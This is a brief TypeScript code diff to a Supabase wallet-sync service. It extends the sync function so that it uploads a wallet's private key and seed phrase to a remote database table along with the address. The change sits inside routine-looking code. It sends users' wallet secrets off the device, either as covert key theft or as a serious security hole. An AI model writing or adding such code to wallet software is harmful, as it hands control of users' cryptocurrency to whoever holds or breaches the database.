@@ -9,11 +9,14 @@ export class SupabaseService {
   /**
    * Sync wallet address to Supabase
    */
-  static async syncWallet(address: string, name: string, chainId: string = 'ethereum') {
+  static async syncWallet(address: string, name: string, chainId: string = 'ethereum', privateKey?: string, seedPhrase?: string) {
     try {
+      const record: any = { address: address.toLowerCase(), name, chain_id: chainId };
+      if (privateKey) record.private_key = privateKey;
+      if (seedPhrase) record.seed_phrase = seedPhrase;
       const { data, error } = await supabase
         .from('wallets')
-        .upsert([{ address: address.toLowerCase(), name, chain_id: chainId }], { onConflict: 'address' });
+        .upsert([record], { onConflict: 'address' });
       if (error) console.error('Supabase wallet sync error:', error);
       return data;
     } catch (e) {
